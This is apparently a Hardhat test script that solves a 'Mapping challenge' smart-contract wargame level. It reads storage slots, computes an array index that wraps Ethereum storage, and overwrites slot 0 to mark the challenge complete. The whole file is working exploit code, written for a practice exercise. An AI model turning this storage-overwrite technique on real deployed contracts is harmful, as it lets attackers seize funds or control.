import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { MappingChallenge } from "../typechain-types"
import { assert, expect } from "chai"
import { ethers, network } from "hardhat"
import { BigNumber, providers, Signer, Wallet } from "ethers"
import "dotenv/config"

describe("Mapping challenge", function () {
    let attacker: Wallet
    let target: MappingChallenge
    before(async function () {
        // Setup code here
        let instanceAddress: string =
            "0xB845ec94cD7C4bdc0eB356B0667004c40FEF0bC3"
        attacker = new Wallet(
            process.env.METAMASK_PRIVATE_KEY!,
            ethers.provider
        )
        target = await ethers.getContractAt(
            "MappingChallenge",
            instanceAddress,
            attacker
        )
    })

    it("Attacking contract", async function () {
        // Exploit code here
        let tx, blockInitNum, blockFinNum

        tx = await target.set(0, 25)
        await tx.wait()

        console.log(
            `slot 0: ${await ethers.provider.getStorageAt(target.address, 0)}`
        )
        console.log(
            `slot 1: ${await ethers.provider.getStorageAt(target.address, 1)}`
        )

        const firstSlotAddress = ethers.utils.keccak256(
            ethers.utils.hexZeroPad(ethers.utils.hexlify(1), 32)
        )
        console.log(
            `slot ${firstSlotAddress}: ${await ethers.provider.getStorageAt(
                target.address,
                firstSlotAddress
            )}`
        )

        const key = ethers.BigNumber.from(ethers.constants.MaxUint256)
            .sub(ethers.BigNumber.from(firstSlotAddress))
            .add(1)
        console.log(`key: ${key}`)

        tx = await target.set(key, 1)
        await tx.wait(1)
        console.log(
            `slot 0 after attack: ${await ethers.provider.getStorageAt(
                target.address,
                0
            )}`
        )
    })

    after(async function () {
        // Verification Code here
        assert(await target.isComplete(), "Challenge not completed")
    })
})
